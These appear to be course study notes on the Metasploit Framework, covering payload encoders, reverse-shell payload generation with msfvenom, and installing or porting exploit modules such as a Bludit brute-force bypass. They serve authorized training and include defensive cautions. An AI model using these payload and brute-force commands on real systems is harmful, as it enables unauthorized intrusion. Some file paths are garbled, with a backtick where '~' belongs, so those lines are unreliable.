# HTB Academy: Using the Metasploit Framework

> Engagement-ready study notes for authorized HTB labs and assessments.

## Module information
- **Latest section added:** 12 / 15 — Writing and Importing Modules
- **Progress at latest capture:** 73.33%
- **Previously documented:** Section 7 / 15 — Encoders (40% at capture)
- **Focus:** Encoder compatibility, bad characters, custom module discovery, module installation, and Ruby module porting.

---

## 7. Encoders

### Learning objectives
- Understand why Metasploit encoders exist.
- Recognize architecture and platform compatibility requirements.
- Understand bad characters and why payloads may need to avoid them.
- Distinguish the historical `msfpayload` / `msfencode` workflow from modern `msfvenom`.
- Inspect compatible encoders in `msfconsole`.
- Explain why encoding does not guarantee antivirus evasion.

### What is an encoder?

A Metasploit encoder transforms a payload representation. Historically, encoders have helped payloads fit architecture or delivery constraints, avoid specified bytes, and change the byte representation.

Architectures named in the lesson:

| Architecture | Meaning |
|---|---|
| `x86` | 32-bit Intel/AMD |
| `x64` | 64-bit Intel/AMD |
| `sparc` | SPARC |
| `ppc` | PowerPC |
| `mips` | MIPS |

**Important:** Encoding is not compilation for another platform, a change in payload capability, or a guarantee of stealth. The payload, target architecture, exploit, and execution environment must still be compatible.

### Bad characters

A bad character is a byte that cannot safely appear in a payload for a particular delivery path. For example, a null byte (`\x00`) may terminate a string in some vulnerable programs or input-handling routines.

Bad-character lists are context-specific. A byte unsafe for one exploit path may be valid in another. Determine constraints from the target and exploit behavior instead of assuming a universal list.

Metasploit's `-b` option supplies bytes to avoid during generation/encoding.

### Historical workflow: msfpayload and msfencode

The course describes the older, pre-2015 workflow:
- `msfpayload` generated the payload.
- `msfencode` encoded its output, for example to avoid a null byte and emit a chosen format.
- A pipe (`|`) passed the first command's output to the second.

Historical example from the lesson:

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

This is legacy syntax illustrating the framework's evolution. Modern installations generally use `msfvenom`; do not assume these older utilities are installed or supported.

### Modern workflow: msfvenom

`msfvenom` combines payload generation and encoding. The lesson's x86 Windows example, with a null byte excluded and Perl output selected:

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

| Option | Purpose |
|---|---|
| `-a x86` | Specify target architecture |
| `--platform windows` | Specify target platform |
| `-p` | Select a payload |
| `LHOST` / `LPORT` | Configure callback address and port for a reverse payload |
| `-b "\x00"` | Identify a byte to avoid |
| `-f perl` | Select output format |

The lesson output reports compatible encoders and shows `x86/shikata_ga_nai` being selected automatically in its example. Availability and selection vary with Metasploit version, payload, architecture, and platform.

**Lab safety:** Generate and execute payloads only in an isolated HTB lab or another explicitly authorized environment. Use lab-assigned callback values rather than copying example addresses into a real network.

### Shikata Ga Nai (SGN)

`x86/shikata_ga_nai` is a polymorphic XOR additive-feedback encoder. The Japanese phrase **仕方がない** is commonly translated as “it cannot be helped” or “nothing can be done.”

The module explains that SGN was historically popular because its output was difficult for older signature-based detection to recognize. Modern antivirus and endpoint detection have improved; an SGN-encoded payload should not be considered undetectable.

The lesson compares the beginning of the generated Perl buffer before and after encoding. The key concept is that encoding changes the byte representation; the underlying payload behavior remains.

### Encoder iterations

The `-i` option controls the number of encoding iterations in the lesson's examples.

- Each successful iteration transforms the representation again.
- Repeated encoding can increase encoded payload size.
- More iterations do not establish that a result is safe or undetectable.
- Compatibility and size constraints still apply.

The module's example reports that ten SGN iterations still resulted in substantial antivirus detection. **Iteration count is not an antivirus-evasion guarantee.**

### Selecting compatible encoders in msfconsole

Within an exploit context, use:

```text
show encoders
```

Metasploit filters the list according to the selected exploit and payload. The output is not necessarily every encoder installed in the framework.

The lesson shows:
- An x64 context may list `x64/xor`, `x64/xor_dynamic`, and `x64/zutto_dekiru`.
- An x86 context may list alpha encoders, `x86/shikata_ga_nai`, and other transformations.
- `generic/none` is also shown as an option in an example.

The exact list depends on framework version and current context. If an encoder is absent, it may simply be incompatible with the selected exploit/payload.

### Antivirus testing: lesson findings

The module submits a generated executable to VirusTotal and shows many antivirus engines identifying it as malicious. It then repeats the experiment with multiple encoding iterations and still observes a high detection count.

The durable conclusions are:
- Encoding changes representation, not the fundamental behavior of a payload.
- Detection may use static signatures, heuristics, machine learning, and runtime behavior.
- Multiple iterations do not guarantee evasion.
- A clean scan result would not prove a file is benign.

The detection percentages in the lesson are historical examples, not current measurements. Vendor engines, signatures, and sample reputation change over time.

**Third-party data caution:** Uploading a sample to VirusTotal can disclose it to the service and its security partners. Never upload client-confidential binaries, proprietary files, credentials, or sensitive artifacts without explicit authorization and an appropriate data-handling decision.

### msf-virustotal

The lesson introduces `msf-virustotal`, which can submit a file for analysis using a VirusTotal API key:

```bash
msf-virustotal -k <API_KEY> -f <FILE>
```

- `-k` supplies the API key.
- `-f` identifies the file.
- Output may include hashes, a report URL, queued-analysis messages, and detections.

Treat API keys as secrets. Do not put a real key in notes, shell transcripts, screenshots, Git commits, or shared reports. Analysis may take time to complete.

### Troubleshooting and interpretation

| Symptom | Possible explanation | What to verify |
|---|---|---|
| No compatible encoders | Selected payload/exploit has no matching encoder | Confirm architecture, platform, payload, exploit |
| Encoder not listed | Incompatible with current selection | Inspect selected payload; rerun `show encoders` |
| Output larger than expected | Encoding and executable format add overhead | Compare reported payload and final file sizes |
| Payload fails to execute | Architecture, platform, transport, or payload mismatch | Validate lab target and compatibility |
| Bad character remains / payload breaks | Constraint incomplete or input path misunderstood | Reassess actual input path and byte constraints |
| Antivirus detects file | Encoding is not reliable evasion | Do not infer safety from iteration count |
| VirusTotal analysis pending | Remote analysis incomplete | Check later; avoid unnecessary resubmission |
| Permission denied writing output | Current user cannot write to selected directory | Use an authorized working directory |

### Defensive perspective

For defenders and detection engineers, consider:
- Unexpected executable creation by penetration-testing tools.
- Suspicious process execution and reverse-connection behavior.
- Different byte representations with similar runtime behavior.
- Endpoint telemetry, network egress, and command-line auditing.
- Hash and reputation checks as only one detection layer.

Encoding is not a substitute for execution controls, behavioral monitoring, least privilege, application control, and network segmentation.

### Engagement workflow checklist

- [ ] Confirm authorization and target scope.
- [ ] Identify target platform and architecture.
- [ ] Understand exploit input and bad-character constraints.
- [ ] Select a compatible payload and output format.
- [ ] Inspect encoders in the current Metasploit context.
- [ ] Treat encoding as a compatibility transformation, not a stealth guarantee.
- [ ] Test only in the approved lab or assessment environment.
- [ ] Protect API keys and generated artifacts.
- [ ] Record tool version, options, output hash, test result, and cleanup.
- [ ] Remove temporary payloads and listeners when the exercise is complete.

### Key takeaways

1. Encoders transform payload representation and can help meet architecture or bad-character constraints.
2. The legacy `msfpayload` and `msfencode` tools were consolidated into `msfvenom`.
3. `show encoders` lists encoders compatible with the current exploit/payload context.
4. Shikata Ga Nai was historically popular, but modern detection can identify encoded payloads.
5. More iterations do not guarantee antivirus evasion.
6. VirusTotal results are time-sensitive, and uploading samples can disclose them to a third party.
7. Compatibility, authorization, evidence handling, and cleanup matter more than assuming an encoded payload is invisible.

---


---

## 12. Writing and Importing Modules

### Learning objectives

- Find Metasploit-ready modules published outside the installed framework.
- Search Exploit Database (ExploitDB) and SearchSploit for modules.
- Understand Metasploit's module directory structure and local module paths.
- Install and load one module without performing a full framework upgrade.
- Port an existing exploit script into a Metasploit Ruby module using an existing module as boilerplate.
- Identify module metadata, mixins, options, references, targets, and exploit code.

### 1. Updating Metasploit vs. installing one module

The lesson describes two approaches:

1. **Update Metasploit:** update the local framework to obtain newly merged exploits, auxiliary modules, and features from the main Metasploit Framework branch.
2. **Install one module manually:** when only a specific module is needed, obtain it and place it in a directory Metasploit searches.

Use the smallest change that satisfies the authorized assessment. A full framework update can change dependencies and module behavior, so record the current framework version before updating a managed environment.

### 2. Search ExploitDB for Metasploit modules

ExploitDB supports filtering by tags. The lesson uses the **Metasploit Framework (MSF)** tag to narrow results to entries supplied in Metasploit module format.

Resource: [Exploit Database — Metasploit Framework tag](https://www.exploit-db.com/?tag=3)

The example target is Nagios3 and the module **Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)**. The course first searches from msfconsole:

```text
msf6 > search nagios
```

The lesson's results include several Nagios modules, but not the specific statuswml.cgi command-injection module being sought. This can mean the local framework version does not include that module.

### 3. Search from the terminal with SearchSploit

SearchSploit is the command-line interface for searching ExploitDB:

```bash
searchsploit nagios3
```

The lesson's sample results include:

| Exploit title | ExploitDB path |
|---|---|
| Nagios3 - history.cgi Host Command Execution (Metasploit) | linux/remote/24159.rb |
| Nagios3 - history.cgi Remote Command Execution | multiple/remote/24084.py |
| Nagios3 - statuswml.cgi Ping Command Execution (Metasploit) | cgi/webapps/16908.rb |
| Nagios3 - statuswml.cgi Command Injection (Metasploit) | unix/webapps/9861.rb |

Filter by title and exclude Python results:

```bash
searchsploit -t Nagios3 --exclude=".py"
```

**Important:** A .rb extension only tells us the file is Ruby. It does not prove that the script is a valid Metasploit module. Some Ruby exploit scripts are standalone programs and do not contain the module structure required by msfconsole. Inspect the source before installing it.

### 4. Understand the Metasploit directories

The lesson identifies the system-wide Metasploit installation directory:

```bash
ls /usr/share/metasploit-framework/
```

Important folders include:

- modules — exploit, auxiliary, post, payload, and other module code.
- plugins — framework plugins.
- scripts — supporting scripts.
- tools — framework utilities.
- config, data, lib, and vendor — configuration, resources, libraries, and dependencies.

The lesson also shows the user's local framework directory:

```bash
ls `/.msf4/
```

It may contain directories such as local, modules, plugins, loot, logs, and history. The local directory may not have the same subdirectory structure as the system-wide installation. Create the matching module path beneath `/.msf4/modules/ when using a user-local module.

### 5. Install a module and load it

The lesson copies the Nagios3 Ruby file into the system-wide Unix web application exploit directory, renaming it to a descriptive snake-case filename:

```bash
sudo cp `/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

Naming conventions highlighted in the lesson:

- Use **snake_case**.
- Use alphanumeric characters and underscores.
- Avoid dashes in module filenames.
- Keep the filename descriptive and aligned with the module's purpose.

The lesson shows several ways to make Metasploit recognize a new module.

**Load a module path at startup:**

```bash
msfconsole -m /usr/share/metasploit-framework/modules/
```

**Load a path from inside msfconsole:**

```text
msf6 > loadpath /usr/share/metasploit-framework/modules/
```

**Reload modules at runtime:**

```text
msf6 > reload_all
```

Then search for or directly select the module:

```text
msf6 > use exploit/unix/webapp/nagios3_command_injection
msf6 exploit(unix/webapp/nagios3_command_injection) > show options
```

The lesson's sample module options include RHOSTS, RPORT, SSL, URI, USER, PASS, and VHOST. These are module-specific; inspect show options rather than assuming another module uses the same names or defaults.

### 6. Port scripts into Metasploit modules

A custom Python, PHP, or other exploit script cannot be loaded as a Metasploit module merely by changing its extension. Porting requires adapting its logic to the Metasploit Framework and writing the module in Ruby.

The lesson highlights:

- Metasploit modules are written in Ruby.
- The lesson specifies **hard tabs** for Ruby module indentation.
- Start from an existing module in the same category when possible.
- Use the existing module as boilerplate, then adapt its metadata, options, mixins, and exploit logic.
- Keep custom modules organized so they can be found and maintained.

The course example uses a Bludit 3.9.2 authentication brute-force mitigation bypass script (48746.rb) and an existing Bludit module as a starting point.

Check the existing module directory:

```bash
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
```

The lesson's example copies the downloaded Ruby script into that directory with a descriptive name:

```bash
sudo cp `/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

After copying, the module must still be adapted and validated. Copying a script into the modules directory does not automatically make it a functional Metasploit module.

### 7. Understand mixins

The lesson's Bludit boilerplate includes these mixins:

| Mixin | Role described in the lesson |
|---|---|
| Msf::Exploit::Remote::HttpClient | Provides methods for acting as an HTTP client when exploiting an HTTP server |
| Msf::Exploit::PhpEXE | Provides a method for generating a first-stage PHP payload |
| Msf::Exploit::FileDropper | Transfers files and handles file cleanup after a session is established |
| Msf::Auxiliary::Report | Provides methods for reporting data to the Metasploit database |

A mixin should be included only when the module uses its functionality. The course concludes that the Bludit port-over example does not need FileDropper, so it can be removed from that module.

To identify the right mixins, classes, and methods, consult the [Metasploit documentation](https://docs.metasploit.com/) and inspect comparable modules in the same category.

### 8. Module metadata and structure

The lesson's module skeleton begins with a class derived from Msf::Exploit::Remote and a ranking:

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      # Module metadata belongs here
    ))
  end
end
```

The example is a structural illustration, not a complete working module. A real module must implement its request handling and exploit logic correctly.

The course highlights these metadata fields:

| Field | Purpose |
|---|---|
| Name | Human-readable module name |
| Description | Explanation of the vulnerability and module behavior |
| License | Module license, such as MSF_LICENSE |
| Author | Original vulnerability discoverer and module author/port author |
| References | CVE, advisory, vendor, patch, and other reference links |
| Platform | Target platform, such as php |
| Arch | Target architecture, such as ARCH_PHP |
| Notes | Side effects, reliability, and stability information |
| Targets | Supported target versions/configurations |
| Privileged | Whether the exploit is expected to require or obtain privileged execution |
| DisclosureDate | Vulnerability disclosure date |
| DefaultTarget | Default target index |

The course's first boilerplate metadata example describes a Bludit directory-traversal/image-upload vulnerability and includes references to CVE-2019-16113. It is existing boilerplate and should not be confused with the later authentication brute-force mitigation bypass example.

The final port-over example is titled **Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass** and references CVE-2019-17240. The lesson includes a description of the vulnerable trust placed in X-Forwarded-For and Client-IP headers in Bludit's getUserIp logic.

### 9. Register module options

Metasploit options describe the values a module needs from the operator. The lesson first shows these Bludit options:

```ruby
register_options(
  [
    OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
    OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
    OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
  ])
```

The lesson then explains that the brute-force port-over needs a password wordlist rather than one fixed password. It replaces the password option with an OptPath:

```ruby
OptPath.new('PASSWORDS', [true, 'The list of passwords',
  File.join(Msf::Config.data_directory, "wordlists", "passwords.txt")])
```

Interpretation:

- TARGETURI is the base path for the Bludit application.
- BLUDITUSER is the account name supplied to the module.
- PASSWORDS is a path to the wordlist file.
- The first value in the option definition indicates whether the option is required.
- The example default wordlist path is built from Metasploit's configured data directory.

Only use password testing against systems and accounts explicitly included in the written scope. Apply agreed rate limits and account-lockout safeguards. Never place real client passwords or private wordlists in public repositories.

### 10. Adapt the exploit logic

The lesson's final example shows portions of the Bludit port-over logic, including:

- A helper to retrieve the CSRF token from the login page.
- A helper to determine whether authentication succeeded by checking the HTTP redirect and dashboard location.
- A routine that iterates through a supplied wordlist.
- HTTP headers and form fields used in the authentication request.
- Output indicating attempted passwords and a successful match.

The source excerpt includes a get_csrf helper, an auth_ok? helper, and a bruteforce_auth routine using HTTPClient. It also contains commented-out command-line scaffolding. These fragments illustrate how a standalone proof of concept is adapted; they are not, by themselves, proof that the resulting module is complete or compatible with a current Metasploit release.

When porting, map each standalone-script responsibility to an appropriate Metasploit method and option. Validate HTTP behavior, CSRF handling, redirects, error cases, and cleanup in an isolated lab before relying on the module.

### 11. Documentation and references

The lesson recommends consulting:

- [Metasploit documentation](https://docs.metasploit.com/) for module APIs, mixins, classes, and methods.
- [Metasploit Framework source](https://github.com/rapid7/metasploit-framework) for current module examples and conventions.
- *Metasploit: A Penetration Tester's Guide* from No Starch Press for deeper Ruby module development background.

### Troubleshooting

| Symptom | Likely cause | What to check |
|---|---|---|
| search cannot find the module | Module is not installed or indexed in this framework version | Search ExploitDB/SearchSploit and verify the module source |
| SearchSploit returns .py and .rb files | Results include different implementation languages | Inspect the file; .rb alone does not mean MSF-compatible |
| Module is not recognized after copying | Wrong directory, filename, or module structure | Confirm path under modules/ and use snake_case |
| reload_all reports an error | Ruby syntax error, missing dependency, or invalid module structure | Read the exact error and validate module code |
| Module appears but fails to load | Missing mixin, method, or incompatible API | Compare with current modules and official documentation |
| Required options are unset | Module expects values not configured | Run show options and set only values required by the lab |
| Module runs but HTTP interaction fails | URI, authentication, CSRF, target version, or HTTP behavior differs | Verify application version and request/response flow in scope |
| Local module path is not searched | Directory structure is incomplete or path not loaded | Use the expected `/.msf4/modules/ hierarchy and loadpath |

### Engagement-ready workflow

```text
1. Confirm the target and activity are authorized and in scope.
2. Record the local Metasploit version.
3. Search msfconsole first; if absent, search ExploitDB/SearchSploit.
4. Inspect the source and confirm whether it is a Metasploit module or standalone script.
5. Choose a system-wide or user-local module directory.
6. Use a descriptive snake_case filename and the correct module category.
7. Load the module with -m, loadpath, or reload_all.
8. Search for it or use its module path directly.
9. Inspect show options and configure only the approved lab target.
10. If porting, start from a relevant boilerplate module and adapt metadata, mixins, options, and logic.
11. Validate syntax, behavior, compatibility, and cleanup in an isolated lab.
12. Record the module source, version, changes, test evidence, and limitations.
```

### Key takeaways

1. A full Metasploit update is not always necessary when only one module is required.
2. ExploitDB's MSF tag and SearchSploit can help locate Metasploit-format modules.
3. A Ruby .rb file is not automatically a valid Metasploit module.
4. Correct module directory structure and snake_case naming help Metasploit discover local modules.
5. loadpath, msfconsole -m, and reload_all are ways to load additional modules.
6. Porting requires adapting exploit logic to Ruby and the Metasploit module API.
7. Mixins provide reusable functionality; include only what the module actually needs.
8. Module metadata and registered options make the module understandable and configurable.
9. Validate custom modules in a controlled lab and keep client data, credentials, and private wordlists out of public Git repositories.


## Source scope

Based on the supplied HTB Academy **Using the Metasploit Framework — Section 7: Encoders** material. Explanatory notes and operational cautions are added for clarity; historical command examples and detection figures are retained as lesson examples, not claims about current tool or antivirus behavior.
